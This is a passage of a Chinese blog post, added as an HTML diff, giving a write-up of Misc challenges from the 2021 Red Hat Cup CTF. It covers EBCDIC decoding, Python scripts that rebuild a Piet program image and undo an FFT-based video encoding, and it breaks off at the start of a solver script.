@@ -1,0 +1,1700 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CTF | 2021 红帽杯 WriteUp, MiaoTony,blog">
+    <meta name="description" content="前段时间打了个红帽杯，不过这段时间比较忙一直没空整理。趁着今天摸鱼，就来复现几道题好了。">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159946730-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-159946730-1');
+</script>
+
+
+    <title>CTF | 2021 红帽杯 WriteUp | MiaoTony&#39;s小窝</title>
+    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/favicon.ico">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/matery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/my.css">
+	
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/jquery/jquery.min.js"></script>
+    <script>
+        //来个特效玩玩喵 20200123
+        var titleTime;
+        var OriginTitile = document.title;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '|ω·) 喵~快回来呀！';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(/≧▽≦)/ Meow！';
+                titleTime = setTimeout(function() {
+        	    document.title = OriginTitile;
+        }, 800);
+    }
+        });
+    </script>
+<meta name="generator" content="Hexo 5.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="MiaoTony's小窝" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">MiaoTony&#39;s小窝</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友链</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">MiaoTony&#39;s小窝</div>
+        <div class="logo-desc">
+            
+            喵~欢迎各位大佬的来访呀！
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友链
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/22.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">CTF | 2021 红帽杯 WriteUp</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        min-width: 240px;
+        padding-left: 15px;
+        padding-bottom: 30px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 30px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+	    max-height: 450px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/WriteUp/">
+                                <span class="chip bg-color">WriteUp</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-05-24
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.2k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    11 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p><img src="/2021/05/24/CTF_2021RedHat/image-20210509221201690.png"></p>
+<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><blockquote>
+<p><strong>第四届“红帽杯”网络安全大赛</strong></p>
+<p>比赛时间：2021年5月9日10:00-18:00</p>
+<p><a target="_blank" rel="noopener" href="https://race.ichunqiu.com/2021redhat">https://race.ichunqiu.com/2021redhat</a></p>
+</blockquote>
+<p>前段时间打了个红帽杯，不过这段时间一直在忙没空整理 Writeup。</p>
+<p>趁着今天摸鱼，复现了两道 Misc 题。其他就简单记录一下吧。</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>EBCDIC 编码</p>
+<p><img src="/2021/05/24/CTF_2021RedHat/upload_1d74aac0f0ef87a00013abb1375f1c44.png"></p>
+<p><code>flag{we1c0me_t0_redhat2021}</code></p>
+<h3 id="colorful-code"><a href="#colorful-code" class="headerlink" title="colorful code"></a>colorful code</h3><blockquote>
+<p>colorful code is beautiful, isn’t it?</p>
+<p>最终得到flag的格式中加上flag{}包裹再提交</p>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1_mvdJ5G6qPTFOd0jfnPwFw">附件下载</a> 提取码（GAME）<a target="_blank" rel="noopener" href="https://share.weiyun.com/phvaVooK">备用下载</a></p>
+</blockquote>
+<p>下载下来两个 <code>data{1,2}</code></p>
+<p>data1 是一串 0-19 之间的数字</p>
+<p><img src="/2021/05/24/CTF_2021RedHat/image-20210509215634320.png" alt="data1"></p>
+<p>data2 是一堆奇奇怪怪但又有规律的字符</p>
+<p><img src="/2021/05/24/CTF_2021RedHat/image-20210509215902936.png" alt="data2"></p>
+<p>而 data2 这最前面的东西好像颜色的标识啊。就类似于 <code>#FF0000</code> 这样。</p>
+<p>于是发现可能是 <strong>npiet</strong>。</p>
+<p>参考 <a target="_blank" rel="noopener" href="https://www.dangermouse.net/esoteric/piet.html">https://www.dangermouse.net/esoteric/piet.html</a></p>
+<blockquote>
+<p>Piet is a programming language in which programs look like abstract paintings. The language is named after <a target="_blank" rel="noopener" href="http://www.ibiblio.org/wm/paint/auth/mondrian/">Piet Mondrian</a>, who pioneered the field of geometric abstract art. I would have liked to call the language Mondrian, but <a target="_blank" rel="noopener" href="https://link.springer.com/chapter/10.1007/3-540-45337-7_9">someone beat me to it</a> with a rather mundane-looking scripting language. Oh well, we can’t all be esoteric language writers I suppose.</p>
+</blockquote>
+<p>参考 <a target="_blank" rel="noopener" href="https://www.bertnase.de/npiet/">https://www.bertnase.de/npiet/</a></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.bertnase.de/npiet/npiet-screen.png"><strong>npiet</strong></a> is an interpreter for piet programs and takes as input a <a target="_blank" rel="noopener" href="http://www.pmview.com/help/pmview/pbmplus_portable_pixmap_ppm_.html">portable pixmap</a> (a ppm file) and since v0.3a <strong>png</strong> and <strong>gif</strong> files  too - other formats may follow.</p>
+</blockquote>
+<p>这是一种基于图像颜色的编程语言，当然还有其他有意思而神秘的编程语言，详见 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Esoteric_programming_language">Esoteric programming language</a>。</p>
+<p>统计一下 data1 总共有 7076 个数字，<a target="_blank" rel="noopener" href="http://tools.jb51.net/jisuanqi/factor_calc">分解质因数</a> 得到为 37*191。</p>
+<p>考虑这就是图像的宽和高了。</p>
+<p>按照原版的映射，颜色应该对应是下图这样的。</p>
+<p><img src="/2021/05/24/CTF_2021RedHat/image-20210509220834285.png"></p>
+<p>然而这题里魔改了一下，就根据 data2 重新映射一下。</p>
+<p>写个 jio本。</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""
+MiaoTony
+"""</span>
+<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
+
+x <span class="token operator">=</span> <span class="token number">37</span>
+y <span class="token operator">=</span> <span class="token number">191</span>
+
+c <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 原版映射</span>
+<span class="token comment"># colors = ["FFC0C0", "FFFFC0", "C0FFC0",</span>
+<span class="token comment">#           "C0FFFF", "C0C0FF", "FFC0FF",</span>
+<span class="token comment">#           "FF0000", "FFFF00", "00FF00",</span>
+<span class="token comment">#           "00FFFF", "0000FF", "FF00FF",</span>
+<span class="token comment">#           "C00000", "C0C000", "00C000",</span>
+<span class="token comment">#           "00C0C0", "0000C0", "C000C0",</span>
+<span class="token comment">#           "000000", "FFFFFF"]</span>
+
+<span class="token comment"># 按照 data2 前20个像素来映射</span>
+colors <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'0000C0'</span><span class="token punctuation">,</span> <span class="token string">'00FFFF'</span><span class="token punctuation">,</span> <span class="token string">'00FF00'</span><span class="token punctuation">,</span> <span class="token string">'FFC0FF'</span><span class="token punctuation">,</span> <span class="token string">'FFC0C0'</span><span class="token punctuation">,</span> <span class="token string">'C0C0FF'</span><span class="token punctuation">,</span> <span class="token string">'C0C000'</span><span class="token punctuation">,</span> <span class="token string">'FF00FF'</span><span class="token punctuation">,</span> <span class="token string">'FF0000'</span><span class="token punctuation">,</span>
+          <span class="token string">'C00000'</span><span class="token punctuation">,</span> <span class="token string">'C000C0'</span><span class="token punctuation">,</span> <span class="token string">'FFFFFF'</span><span class="token punctuation">,</span> <span class="token string">'FFFF00'</span><span class="token punctuation">,</span> <span class="token string">'FFFFC0'</span><span class="token punctuation">,</span> <span class="token string">'00C000'</span><span class="token punctuation">,</span> <span class="token string">'00C0C0'</span><span class="token punctuation">,</span> <span class="token string">'C0FFFF'</span><span class="token punctuation">,</span> <span class="token string">'C0FFC0'</span><span class="token punctuation">,</span> <span class="token string">'0000FF'</span><span class="token punctuation">]</span>
+
+
+<span class="token keyword">def</span> <span class="token function">hex2int</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+cnt <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        color <span class="token operator">=</span> colors<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>l<span class="token punctuation">[</span>cnt<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+        c<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">]</span><span class="token punctuation">,</span> hex2int<span class="token punctuation">(</span>color<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        cnt <span class="token operator">+=</span> <span class="token number">1</span>
+
+c<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
+c<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"c.png"</span><span class="token punctuation">)</span></code></pre>
+<p>得到</p>
+<p><img src="/2021/05/24/CTF_2021RedHat/c.png" alt="c"></p>
+<p>再到 <strong><a target="_blank" rel="noopener" href="https://www.bertnase.de/npiet/npiet-execute.php">npiet online</a></strong> 上去执行一下，就能拿到 flag 了。</p>
+<p><img src="/2021/05/24/CTF_2021RedHat/image-20210509220347028.png"></p>
+<p><code>flag{88842f20-fb8c-45c9-ae8f-36135b6a0f11}</code></p>
+<h3 id="PicPic"><a href="#PicPic" class="headerlink" title="PicPic"></a>PicPic</h3><blockquote>
+<p>你想成为CV大师嘛？</p>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1GiXAmi2ZRVL4hBKTovfX9w">附件下载</a> 提取码（GAME）<a target="_blank" rel="noopener" href="https://share.weiyun.com/XyY8ELYw">备用下载</a></p>
+</blockquote>
+<h4 id="challenge-1"><a href="#challenge-1" class="headerlink" title="challenge 1"></a>challenge 1</h4><p><code>create.py</code></p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
+<span class="token keyword">import</span> cv2
+<span class="token keyword">import</span> struct
+<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
+
+
+<span class="token keyword">def</span> <span class="token function">mapping</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> down<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> up<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span> tp<span class="token operator">=</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data_max <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    data_min <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    interval <span class="token operator">=</span> data_max <span class="token operator">-</span> data_min
+    new_interval <span class="token operator">=</span> up <span class="token operator">-</span> down
+    new_data <span class="token operator">=</span> <span class="token punctuation">(</span>data <span class="token operator">-</span> data_min<span class="token punctuation">)</span> <span class="token operator">*</span> new_interval <span class="token operator">/</span> interval <span class="token operator">+</span> down
+    new_data <span class="token operator">=</span> new_data<span class="token punctuation">.</span>astype<span class="token punctuation">(</span>tp<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> new_data
+
+
+<span class="token keyword">def</span> <span class="token function">fft</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img<span class="token punctuation">)</span>
+    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fftshift<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>
+    m <span class="token operator">=</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>fft<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p <span class="token operator">=</span> np<span class="token punctuation">.</span>angle<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> m<span class="token punctuation">,</span> p
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">)</span>
+    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>
+    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'frame'</span><span class="token punctuation">)</span>
+    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ffmpeg -i secret.mp4 frame/%03d.png'</span><span class="token punctuation">)</span>
+
+    files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'frame'</span><span class="token punctuation">)</span>
+    r_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>
+        img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'frame/</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>IMREAD_GRAYSCALE<span class="token punctuation">)</span>
+
+        m<span class="token punctuation">,</span> p <span class="token operator">=</span> fft<span class="token punctuation">(</span>img<span class="token punctuation">)</span>
+        r_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'!ff'</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        new_img1 <span class="token operator">=</span> mapping<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
+        new_img2 <span class="token operator">=</span> mapping<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+
+        cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'm/</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> new_img1<span class="token punctuation">)</span>
+        cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'p/</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> new_img2<span class="token punctuation">)</span>
+
+    r_file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ffmpeg -i m/%03d.png -r 25 -vcodec png 1.mkv'</span><span class="token punctuation">)</span>
+    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ffmpeg -i p/%03d.png -r 25 -vcodec png 2.mkv'</span><span class="token punctuation">)</span></code></pre>
+<p>可以发现把视频切分得到每一帧，然后 FFT 得到幅度m和相位p，再合并得到两个视频。文件 <code>r</code> 里存了每一帧中幅值的最大和最小值。</p>
+<p>那咱就反过来，通过幅值和相位的视频切分得到每一帧，然后 IFFT 变换回去就完事了。</p>
+<p>相位范围就是 -pi 到 pi 之间。</p>
+<p>写个脚本。</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""
+MiaoTony
+"""</span>
